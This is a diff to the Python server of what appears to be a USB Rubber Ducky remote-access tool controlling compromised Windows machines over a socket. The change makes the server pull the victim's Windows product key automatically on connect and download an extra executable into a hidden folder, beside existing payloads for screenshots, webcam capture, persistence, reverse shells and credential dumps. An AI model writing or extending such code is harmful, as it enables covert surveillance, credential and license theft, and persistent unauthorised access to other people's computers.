@@ -104,6 +104,9 @@ print("Elevated Powershell:   " + elevation)
 conn.send("$env:OS\n".encode())
 operating_system = conn.recv(1024).decode().split("\n")[0]
 print("Operating System:      " + operating_system)
+conn.send("(wmic path SoftwareLicensingService get OA3xOriginalProductKey)[2]\n".encode())
+license_key = conn.recv(1024).decode().split("\n")[0]
+print("License Key:           " + license_key)
 conn.send("cd $env:userprofile; rm -r z; mkdir z; attrib +h z; cd z".encode())
 conn.recv(1024)
 conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/pscp.exe\" \"$env:userprofile//z/pscp.exe\"".encode())
@@ -111,6 +114,8 @@ conn.recv(1024)
 conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/screenshot.ps1\" \"$env:userprofile/z/screenshot.ps1\"; . .\screenshot.ps1".encode())
 conn.recv(1024)
 conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/CommandCam.exe\" \"$env:userprofile/z/webcam.exe\"".encode())
+conn.recv(1024)
+conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/pygit.exe\" \"$env:userprofile/z/pygit.exe\"".encode())
 conn.recv(1024)
 conn.send("cd $env:userprofile".encode())
 threading.Thread(target=recv, args=(conn,)).start()
@@ -147,6 +152,7 @@ while not stop:
             print("                     -pid         Show Powershell PID")
             print("                     -e           Show Powershell elevation status")
             print("                     -os          Show operating system")
+            print("                     -k           Show license key")
             print("ducky/persistence    N/A          Set up a persistent shell")
             print("                     -d           Delete the persistent shell")
             print("ducky/reverse_shell  [ip:port]    Set up a custom reverse shell")
@@ -174,7 +180,6 @@ while not stop:
             print("ducky/creds          N/A          Preform a credential dump")
             print("ducky/print          [file]       Print a file to the default printer")
             print("ducky/ls             N/A          List files by date modified")
-            print("ducky/product_key    N/A          Get Windows Product Key")
             stdin = ""
         elif ducky_command[:4] == "quit":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -215,6 +220,8 @@ while not stop:
                 print("Elevated Powershell:    " + elevation)
             if "-os" in options or "-a" in options:
                 print("Operating System:       " + operating_system)
+            if "-k" in options or "-a" in options:
+                print("License Key:            " + license_key)
             stdin = ""
         elif ducky_command[:11] == "persistence":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -351,10 +358,6 @@ while not stop:
         elif ducky_command[:2] == "ls":
             commands = []
             commands.append("(ls | sort lastwritetime -descending | out-string).trim()")
-            stdin = "; ".join(commands)
-        elif ducky_command[:11] == "product_key":
-            commands = []
-            commands.append("(wmic path SoftwareLicensingService get OA3xOriginalProductKey)[2]")
             stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
